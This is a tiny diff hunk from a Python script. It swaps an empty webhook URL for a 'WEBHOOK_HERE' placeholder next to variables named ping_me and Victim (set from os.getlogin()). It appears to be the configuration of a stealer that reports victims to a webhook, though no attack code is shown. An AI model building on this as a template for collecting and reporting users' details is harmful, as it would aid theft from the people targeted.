@@ -6,7 +6,7 @@ import urllib.request
 import datetime
 
 ping_me = True
-webhook_url = ''
+webhook_url = 'WEBHOOK_HERE'
 Victim = os.getlogin()
 
 
